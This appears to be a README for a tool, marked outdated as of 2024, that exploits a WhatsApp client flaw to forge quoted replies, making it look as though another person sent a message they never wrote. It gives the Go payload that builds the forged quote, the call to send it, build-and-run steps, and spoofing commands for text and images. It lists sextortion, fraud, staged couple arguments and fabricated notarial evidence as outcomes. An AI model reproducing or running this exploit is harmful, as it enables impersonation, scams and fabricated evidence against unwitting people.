<h3><p align="center">The Tool Made In 2022 ( Outdated 2024 )</p></h3>

# Whatsapp Spoofing impersonate of reply message

All official WhatsApp clients, upon receiving a "Message Reply" payload (QuotedMessage), do not validate whether the "ContextInfo" of this "QuotedMessage" is valid/exists ("StanzaId" and "Participant"). This allows a malicious actor to send in private chats or groups a "QuotedMessage" of a message that never existed on behalf of another person. This is highly critical and dangerous.

## Impact

Malicious individuals can use this to create issues such as:

- Arguments between couples
- Sextortion scams
- Frauds against financial institutions
- In Brazil, someone could take a cellphone to a notary office to register a "Notarial Act" to create a record that could be used in legal proceedings, claiming that the original message was deleted but keeping the evidence of the "QuotedMessage."
- Creating embarrassing situations involving public figures (famous actors, politicians, etc.)


## The problem

Users: UserA, UserB; UserA is not known by UserB

UserA (SCAMMER) sends a spoofed messages to UserB in response to a message that UserB did never send

Spoofed message payload:

```go
msg := &waProto.Message{
    ExtendedTextMessage: &waProto.ExtendedTextMessage{
        Text: proto.String("Some text"),
        ContextInfo: &waProto.ContextInfo{
            StanzaId:     proto.String("Some Random ID"), //Random ID
            Participant: proto.String("5511999999999@s.whatsapp.net"), //Spoofed user ID
            QuotedMessage: &waProto.Message{
                Conversation: proto.String("Some Spoofed text"), //QuotedMessage Spoofed text
            },
        },
    },
}
```

Send the Spoofed Payload:

```go
resp, err := cli.SendMessage(context.Background(), chatID, msg) 
// chatID is the ID of the chat you want to send the message to, can be a group or the same number as the spoofed user ID
```

## Exploit

#### Clone the repository.

```bash
git clone https://github.com/DevoloperADMIN/API-DEAD-WhatsApp.git
```

### Install dependencies.

```bash
cd API-DEAD-WhatsApp
go mod download
go get 
```

### Build

```bash
go build 
```

### Running

```bash
./whats-spoofing
```

### Usage

#### Retrieve Group Information

```txt
getgroup <jid>
```

#### List Groups

```txt
listgroups
```

#### Send Spoofed Reply

```txt
send-spoofed-reply <chat_jid> <msgID:!|#ID> <spoofed_jid> <spoofed_text>|<text>
```

#### Send Spoofed Image Reply

```txt
send-spoofed-img-reply <chat_jid> <msgID:!|#ID> <spoofed_jid> <spoofed_file> <spoofed_text>|<text>
```

#### Send Spoofed Demo Message

```txt
send-spoofed-demo <toGender:boy|girl> <language:br|en> <chat_jid> <spoofed_jid>
```

#### Send Spoofed Demo Message with Image

```txt
send-spoofed-demo-img <toGender:boy|girl> <language:br|en> <spoofed_jid> <spoofed_img>
```

